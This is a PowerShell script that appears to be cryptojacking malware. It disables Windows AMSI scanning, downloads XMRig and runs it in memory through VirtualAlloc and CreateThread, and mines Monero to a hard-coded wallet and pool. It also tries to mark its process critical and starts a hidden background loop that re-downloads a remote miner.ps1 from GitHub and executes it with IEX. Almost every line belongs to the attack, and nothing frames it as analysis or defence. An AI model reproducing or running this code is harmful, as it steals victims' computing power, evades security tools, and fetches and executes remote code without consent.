try{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiSession','NonPublic,Static');if($f){[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$f.GetValue($null),6)}}catch{}

$worker="KAGE-"+([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$env:COMPUTERNAME-$env:USERNAME-$(hostname)"))).Substring(0,16)-replace'[+/=]','X'

$wallet="878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
$pool="gulf.moneroocean.stream:10128"
$args="-o $pool -u $wallet -p $worker --tls --cpu-max-threads-hint=95 --randomx-1gb-pages --donate-level=1 -k --no-color"

Write-Host "[+] download XMRig..." -ForegroundColor Green
$zip = (New-Object Net.WebClient).DownloadData("https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip")

Add-Type -AssemblyName System.IO.Compression.FileSystem
$stream = New-Object IO.MemoryStream(,$zip)
$archive = New-Object IO.Compression.ZipArchive($stream)
$entry = $archive.GetEntry("xmrig.exe")
$exeStream = $entry.Open()
$bytes = New-Object byte[] $entry.Length
[void]$exeStream.Read($bytes,0,$bytes.Length)
$exeStream.Close();$stream.Close();$archive.Dispose()

Write-Host "[+] XMRig in Memory" -ForegroundColor Green

$code = @"
using System;using System.Runtime.InteropServices;
public class R{
    [DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
    [DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,ref uint i);
    [DllImport("kernel32")]static extern uint WaitForSingleObject(IntPtr h,uint t);
    public static void Go(byte[] b){
        IntPtr a=VirtualAlloc(IntPtr.Zero,(uint)b.Length,0x3000,0x40);
        Marshal.Copy(b,0,a,b.Length);
        uint i=0;
        IntPtr h=CreateThread(IntPtr.Zero,0,a,IntPtr.Zero,0,ref i);
        WaitForSingleObject(h,0xFFFFFFFF);
    }
}
"@
Add-Type $code
[R]::Go($bytes)

Write-Host "[+] Майнер запущен! Worker: $worker" -ForegroundColor Cyan
Write-Host "[+] Логи XMRig:" -ForegroundColor Magenta

try{
$src=@"
using System;using System.Runtime.InteropServices;
public class I{
    [DllImport("ntdll.dll")]static extern uint RtlAdjustPrivilege(int,bool,bool,out bool);
    [DllImport("ntdll.dll")]static extern uint NtSetInformationProcess(IntPtr,int,ref int,int);
    public static void Go(){bool b;RtlAdjustPrivilege(20,true,false,out b);int v=-1;NtSetInformationProcess((IntPtr)(-1),29,ref v,4);}
}
"@
Add-Type $src;[I]::Go()
} catch {}

Start-Job -ScriptBlock {while($true){Start-Sleep 300;if(!(Get-Process powershell -ea 0|Where-Object{$_.CommandLine -like "*miner.ps1*"})){powershell -nop -win hidden -c "IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fokisfisi-rgb/sisi/refs/heads/main/miner.ps1'))"}}} | Out-Null